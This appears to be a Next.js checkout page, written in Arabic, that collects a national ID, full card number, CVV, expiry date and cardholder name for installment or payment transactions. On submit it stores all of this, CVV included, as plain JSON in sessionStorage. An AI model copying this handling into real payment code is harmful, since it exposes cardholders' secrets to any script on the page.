"use client";

import { useState, useRef, useLayoutEffect } from "react";
import { useRouter } from "next/navigation";
import toast from "react-hot-toast";
import Header from "../../components/Header";
import BottomNav from "../../components/BottomNav";
import { useSettings } from "@/lib/useSettings";
import { FormData, TransactionType, TRANSACTION_LABELS } from "@/lib/types";

const transactionTypes: { value: TransactionType; icon: string; desc: string }[] = [
  { value: "installments", icon: "calendar_month", desc: "توزيع المدفوعات على أقساط" },
  { value: "deduction", icon: "account_balance_wallet", desc: "خصم شهري تلقائي مجدول" },
  { value: "refund", icon: "assignment_return", desc: "استرجاع معاملة سابقة" },
  { value: "payment", icon: "payments", desc: "تسوية فورية لمرة واحدة" },
];

function formatCard(raw: string) {
  return raw.replace(/(.{4})(?=.)/g, "$1 ");
}

function CardNumberInput({ value, onChange, onBlur, hasError }: {
  value: string;
  onChange: (raw: string) => void;
  onBlur?: () => void;
  hasError?: boolean;
}) {
  const inputRef = useRef<HTMLInputElement>(null);
  // Store the desired cursor position between render and paint
  const nextCursor = useRef<number | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target;
    const cursorBefore = input.selectionStart ?? 0;
    const prevValue = input.value;

    const raw = prevValue.replace(/\D/g, "").slice(0, 16);
    const newFormatted = formatCard(raw);

    // If user deleted a space, move cursor back one more to skip it
    const deletedSpace = prevValue[cursorBefore] === " " && raw.length < value.length;
    const rawDigitsBefore = prevValue.slice(0, cursorBefore).replace(/\D/g, "").length;

    let digits = 0;
    let pos = 0;
    for (pos = 0; pos <= newFormatted.length; pos++) {
      if (digits === rawDigitsBefore) break;
      if (pos < newFormatted.length && newFormatted[pos] !== " ") digits++;
    }
    nextCursor.current = deletedSpace ? Math.max(0, pos - 1) : pos;

    onChange(raw);
  };

  // After React re-renders and paints, restore the cursor
  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 16);
    onChange(pasted);
    nextCursor.current = formatCard(pasted).length;
  };

  // useLayoutEffect fires synchronously after DOM update — before the browser paints
  // This is the correct place to set caret position to avoid flicker
  useLayoutEffect(() => {
    if (nextCursor.current !== null && inputRef.current) {
      inputRef.current.setSelectionRange(nextCursor.current, nextCursor.current);
      nextCursor.current = null;
    }
  });

  return (
    <input
      ref={inputRef}
      className={`w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
        hasError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
      }`}
      dir="ltr"
      style={{ textAlign: "left", unicodeBidi: "plaintext" }}
      value={formatCard(value)}
      onChange={handleChange}
      onPaste={handlePaste}
      onBlur={onBlur}
      placeholder="•••• •••• •••• ••••"
      maxLength={19}
      inputMode="numeric"
      autoComplete="cc-number"
      required
    />
  );
}

function detectCardType(num: string): "visa" | "mastercard" | "unknown" {
  if (num.startsWith("4")) return "visa";
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "mastercard";
  return "unknown";
}

function CreditCard({ cardNumber, cardHolderName, expiryDate, cvv, flipped, cardType }: {
  cardNumber: string;
  cardHolderName: string;
  expiryDate: string;
  cvv: string;
  flipped: boolean;
  cardType: "visa" | "mastercard" | "unknown";
}) {
  const displayNumber = formatCard(cardNumber).padEnd(19, "•").split("");
  const groups = [displayNumber.slice(0, 4), displayNumber.slice(5, 9), displayNumber.slice(10, 14), displayNumber.slice(15, 19)];

  return (
    <div className="w-full flex justify-center mb-8" style={{ perspective: "1000px" }}>
      <div
        className="relative w-full max-w-sm transition-transform duration-700"
        style={{
          height: "200px",
          transformStyle: "preserve-3d",
          transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)",
        }}
      >
        {/* Front */}
        <div
          className="absolute inset-0 rounded-2xl p-6 flex flex-col justify-between overflow-hidden"
          style={{
            backfaceVisibility: "hidden",
            WebkitBackfaceVisibility: "hidden",
            background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%)",
            boxShadow: "0 25px 50px -12px rgba(0,0,0,0.4)",
          }}
        >
          {/* Shine overlay */}
          <div className="absolute inset-0 rounded-2xl" style={{ background: "linear-gradient(135deg, rgba(255,255,255,0.08) 0%, transparent 60%)" }} />

          <div className="flex justify-between items-start relative z-10">
            {/* Chip */}
            <div className="w-10 h-7 rounded-md" style={{ background: "linear-gradient(135deg, #d4af37, #f5d76e, #d4af37)", boxShadow: "0 2px 4px rgba(0,0,0,0.3)" }}>
              <div className="w-full h-full rounded-md grid grid-cols-2 gap-px p-1 opacity-60">
                <div className="bg-yellow-800/40 rounded-sm" /><div className="bg-yellow-800/40 rounded-sm" />
                <div className="bg-yellow-800/40 rounded-sm" /><div className="bg-yellow-800/40 rounded-sm" />
              </div>
            </div>
            {/* Card brand */}
            <div className="text-white">
              {cardType === "visa" && (
                <span className="font-black italic text-2xl tracking-tight" style={{ fontFamily: "serif", textShadow: "0 1px 3px rgba(0,0,0,0.5)" }}>VISA</span>
              )}
              {cardType === "mastercard" && (
                <div className="flex items-center">
                  <div className="w-7 h-7 rounded-full opacity-90" style={{ background: "#eb001b" }} />
                  <div className="w-7 h-7 rounded-full -ml-3 opacity-80" style={{ background: "#f79e1b" }} />
                </div>
              )}
              {cardType === "unknown" && <div className="w-10 h-6 rounded bg-white/10" />}
            </div>
          </div>

          {/* Card Number */}
          <div className="flex gap-4 justify-center relative z-10" dir="ltr">
            {groups.map((g, i) => (
              <span key={i} className="font-mono text-white text-lg tracking-widest" style={{ textShadow: "0 1px 3px rgba(0,0,0,0.5)", letterSpacing: "0.15em" }}>
                {g.join("")}
              </span>
            ))}
          </div>

          <div className="flex justify-between items-end relative z-10">
            <div>
              <p className="text-white/50 text-xs mb-0.5 uppercase tracking-widest">Card Holder</p>
              <p className="text-white font-semibold text-sm uppercase tracking-wider truncate max-w-[160px]">
                {cardHolderName || "YOUR NAME"}
              </p>
            </div>
            <div className="text-right">
              <p className="text-white/50 text-xs mb-0.5 uppercase tracking-widest">Expires</p>
              <p className="text-white font-semibold text-sm font-mono" dir="ltr">{expiryDate || "MM/YY"}</p>
            </div>
          </div>
        </div>

        {/* Back */}
        <div
          className="absolute inset-0 rounded-2xl overflow-hidden flex flex-col justify-center"
          style={{
            backfaceVisibility: "hidden",
            WebkitBackfaceVisibility: "hidden",
            transform: "rotateY(180deg)",
            background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%)",
            boxShadow: "0 25px 50px -12px rgba(0,0,0,0.4)",
          }}
        >
          <div className="w-full h-10 mt-6" style={{ background: "#1a1a1a" }} />
          <div className="px-6 mt-4">
            <p className="text-white/50 text-xs mb-1 uppercase tracking-widest">CVV</p>
            <div className="w-full h-10 rounded-md flex items-center px-4" style={{ background: "rgba(255,255,255,0.9)" }}>
              <span className="font-mono text-gray-800 tracking-widest text-base ml-auto" dir="ltr">
                {cvv ? "•".repeat(cvv.length) : "•••"}
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function DetailsPage() {
  const router = useRouter();
  const { settings, loading } = useSettings();
  const [submitting, setSubmitting] = useState(false);
  const [flipped, setFlipped] = useState(false);
  const [form, setForm] = useState<FormData>({
    cardHolderName: "",
    nationalId: "",
    age: "",
    cardNumber: "",
    cvv: "",
    expiryDate: "",
    transactionType: "installments",
    installmentDay: 1,
    amount: undefined,
  });

  const update = (key: keyof FormData, value: FormData[keyof FormData]) =>
    setForm((p) => ({ ...p, [key]: value }));

  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const touch = (key: string) => setTouched((p) => ({ ...p, [key]: true }));

  function validateCardNumber(v: string) {
    if (!v) return "رقم البطاقة مطلوب";
    if (v.length !== 16) return "رقم البطاقة يجب أن يكون 16 رقماً";
    // Luhn Algorithm
    let sum = 0;
    for (let i = 0; i < 16; i++) {
      let d = Number(v[15 - i]);
      if (i % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
      sum += d;
    }
    if (sum % 10 !== 0) return "رقم البطاقة غير صحيح";
    return "";
  }

  function validateExpiry(v: string) {
    if (!v) return "تاريخ الانتهاء مطلوب";
    if (!/^\d{2}\/\d{2}$/.test(v)) return "صيغة التاريخ غير صحيحة (MM/YY)";
    const [mm, yy] = v.split("/").map(Number);
    if (mm < 1 || mm > 12) return "الشهر غير صحيح";
    const now = new Date();
    const expiry = new Date(2000 + yy, mm - 1, 1);
    const thisMonth = new Date(now.getFullYear(), now.getMonth(), 1);
    if (expiry < thisMonth) return "البطاقة منتهية الصلاحية";
    return "";
  }

  function validateCvv(v: string) {
    if (!v) return "رمز CVV مطلوب";
    if (v.length !== 3) return "رمز CVV يجب أن يكون 3 أرقام";
    return "";
  }

  const cardNumberError = validateCardNumber(form.cardNumber);
  const expiryError = validateExpiry(form.expiryDate);
  const cvvError = validateCvv(form.cvv);

  const needsDay = form.transactionType === "installments" || form.transactionType === "deduction";
  const needsAmount = form.transactionType === "refund" || form.transactionType === "payment";
  const cardType = detectCardType(form.cardNumber);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({ cardNumber: true, expiryDate: true, cvv: true });
    if (!form.cardHolderName || !form.nationalId) {
      toast.error("يرجى تعبئة جميع الحقول المطلوبة");
      return;
    }
    if (cardNumberError || expiryError || cvvError) return;
    if (needsAmount && (!form.amount || form.amount <= 0)) {
      toast.error("يرجى إدخال المبلغ");
      return;
    }
    sessionStorage.setItem("formData", JSON.stringify(form));
    router.push("/checkout/review");
  };

  if (loading) {
    return (
      <div className="flex-1 flex items-center justify-center">
        <div className="animate-spin h-8 w-8 border-4 border-primary border-t-transparent rounded-full" />
      </div>
    );
  }

  return (
    <>
      <Header storeName={settings.storeName} logoUrl={settings.logoUrl} />
      <main className="w-full max-w-2xl mx-auto px-3 sm:px-6 py-6 sm:py-14 mb-24" dir="rtl">

        {/* Step Indicator */}
        <div className="flex flex-col items-center mb-10">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-3 py-1 bg-primary/10 text-primary text-xs font-bold rounded-full tracking-widest uppercase">
              التحقق
            </span>
          </div>
          <h1 className="text-2xl sm:text-4xl font-extrabold text-on-background tracking-tight">بيانات العميل</h1>
          <p className="text-secondary mt-2 text-base">الخطوة 2 من 4</p>
          <div className="flex gap-2 mt-6 w-full max-w-xs sm:max-w-sm">
            <div className="h-2 w-full bg-primary rounded-full"></div>
            <div className="h-2 w-full bg-primary rounded-full"></div>
            <div className="h-2 w-full bg-surface-container-highest rounded-full"></div>
            <div className="h-2 w-full bg-surface-container-highest rounded-full"></div>
          </div>
        </div>



        {/* Form Card */}
        <div className="bg-white rounded-2xl shadow-[0_8px_32px_0_rgba(0,0,0,0.06)] p-4 sm:p-8 md:p-12">
        {/* Credit Card Preview */}
          <CreditCard
            cardNumber={form.cardNumber}
            cardHolderName={form.cardHolderName}
            expiryDate={form.expiryDate}
            cvv={form.cvv}
            flipped={flipped}
            cardType={cardType}
          />

          <form onSubmit={handleSubmit} className="space-y-10">

            {/* Fields in order: nationalId, cardNumber, cvv, expiryDate, cardHolderName */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-5">

              {/* 1. رقم الهوية */}
              <div className="flex flex-col gap-1 sm:col-span-2">
                <label className="text-base font-semibold text-secondary px-1">رقم الهوية الوطنية *</label>
                <input
                  className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
                  value={form.nationalId}
                  onChange={(e) => update("nationalId", e.target.value.replace(/\D/g, ""))}
                  placeholder="أدخل رقم الهوية الوطنية"
                  maxLength={10}
                  required
                />
              </div>

              {/* 2. رقم البطاقة */}
              <div className="flex flex-col gap-1 sm:col-span-2" dir="ltr">
                <label className="text-base font-semibold text-secondary px-1" dir="rtl">رقم البطاقة *</label>
                <CardNumberInput
                  value={form.cardNumber}
                  onChange={(raw) => update("cardNumber", raw)}
                  onBlur={() => touch("cardNumber")}
                  hasError={!!(touched.cardNumber && cardNumberError)}
                />
                {touched.cardNumber && cardNumberError && (
                  <p className="text-error text-xs px-1 mt-0.5" dir="rtl">{cardNumberError}</p>
                )}
              </div>

              {/* 3. CVV */}
              <div className="flex flex-col gap-1">
                <label className="text-base font-semibold text-secondary px-1">رمز CVV *</label>
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
                    touched.cvv && cvvError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={form.cvv}
                  onChange={(e) => {
                    update("cvv", e.target.value.replace(/\D/g, ""));
                    setFlipped(true);
                  }}
                  onBlur={() => { setFlipped(false); touch("cvv"); }}
                  placeholder="•••"
                  maxLength={3}
                  inputMode="numeric"
                  required
                />
                {touched.cvv && cvvError && (
                  <p className="text-error text-xs px-1 mt-0.5">{cvvError}</p>
                )}
              </div>

              {/* 4. تاريخ الانتهاء */}
              <div className="flex flex-col gap-1">
                <label className="text-base font-semibold text-secondary px-1">تاريخ انتهاء البطاقة *</label>
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
                    touched.expiryDate && expiryError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={form.expiryDate}
                  onChange={(e) => {
                    let v = e.target.value.replace(/\D/g, "");
                    if (v.length >= 2) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                    update("expiryDate", v);
                  }}
                  onBlur={() => touch("expiryDate")}
                  placeholder="MM/YY"
                  maxLength={5}
                  inputMode="numeric"
                  required
                />
                {touched.expiryDate && expiryError && (
                  <p className="text-error text-xs px-1 mt-0.5">{expiryError}</p>
                )}
              </div>

              {/* 5. اسم حامل البطاقة */}
              <div className="flex flex-col gap-1 sm:col-span-2">
                <label className="text-base font-semibold text-secondary px-1">اسم حامل البطاقة *</label>
                <input
                  className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none uppercase"
                  value={form.cardHolderName}
                  onChange={(e) => update("cardHolderName", e.target.value)}
                  placeholder="أدخل اسم حامل البطاقة"
                  required
                />
              </div>
            </div>

            {/* Transaction Type Cards */}
            <div>
              <h3 className="text-xl font-bold text-on-background mb-5">اختر نوع المعاملة</h3>
              <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-2 gap-3">
                {transactionTypes.map((t) => (
                  <label
                    key={t.value}
                    className={`relative flex items-center p-3 sm:p-5 cursor-pointer rounded-xl border-2 transition-all ${
                      form.transactionType === t.value
                        ? "bg-surface-container-low border-primary"
                        : "bg-surface-container-low border-transparent hover:border-outline-variant/30"
                    }`}
                  >
                    <input
                      type="radio"
                      name="transaction_type"
                      value={t.value}
                      checked={form.transactionType === t.value}
                      onChange={() => update("transactionType", t.value)}
                      className="hidden"
                    />
                    <div className="flex items-center gap-3">
                      <div className="w-9 h-9 sm:w-12 sm:h-12 shrink-0 rounded-xl bg-white flex items-center justify-center text-primary shadow-sm">
                        <span className="material-symbols-outlined text-[20px] sm:text-[24px]">{t.icon}</span>
                      </div>
                      <div className="min-w-0">
                        <p className="font-bold text-sm sm:text-base text-on-surface">{TRANSACTION_LABELS[t.value]}</p>
                        <p className="text-xs sm:text-sm text-on-surface-variant mt-0.5 leading-tight">{t.desc}</p>
                      </div>
                    </div>
                    <div className={`mr-auto transition-opacity ${form.transactionType === t.value ? "opacity-100" : "opacity-0"} text-primary`}>
                      <span className="material-symbols-outlined">check_circle</span>
                    </div>
                  </label>
                ))}
              </div>
            </div>

            {/* Dynamic Fields */}
            <div className="space-y-6 pt-4 border-t border-surface-container-high">
              {needsDay && (
                <div className="relative flex flex-col gap-1">
                  <label className="text-base font-semibold text-secondary px-1">اختر يوم السداد الشهري</label>
                  <select
                    className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 appearance-none outline-none"
                    value={form.installmentDay}
                    onChange={(e) => update("installmentDay", Number(e.target.value))}
                  >
                    {Array.from({ length: 31 }, (_, i) => i + 1).map((d) => (
                      <option key={d} value={d}>اليوم {d} من الشهر</option>
                    ))}
                  </select>
                  <div className="absolute left-4 top-10 pointer-events-none text-on-surface-variant">
                    <span className="material-symbols-outlined">expand_more</span>
                  </div>
                </div>
              )}

              {needsAmount && (
                <div className="flex flex-col gap-1">
                  <label className="text-base font-semibold text-secondary px-1">
                    {form.transactionType === "refund" ? "المبلغ المراد استرجاعه (د.ك)" : "المبلغ المطلوب دفعه (د.ك)"} *
                  </label>
                  <input
                    type="number"
                    className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
                    value={form.amount || ""}
                    onChange={(e) => update("amount", Number(e.target.value))}
                    placeholder="0.00"
                    min="0"
                    step="0.01"
                    required
                  />
                </div>
              )}
            </div>

            {/* Navigation Buttons */}
            <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-6">
              <button
                type="button"
                onClick={() => router.back()}
                className="w-full sm:w-auto px-8 py-4 rounded-xl bg-surface-container-high text-on-surface text-base font-bold hover:bg-surface-container-highest transition-all text-center"
              >
                رجوع
              </button>
              <button
                type="submit"
                disabled={submitting}
                className="w-full sm:w-auto px-10 py-4 rounded-xl bg-gradient-to-br from-primary to-primary-container text-white text-base font-bold shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all text-center disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {submitting ? "جاري التحقق..." : "المتابعة للخطوة التالية"}
              </button>
            </div>
          </form>
        </div>
      </main>
      <BottomNav />
    </>
  );
}
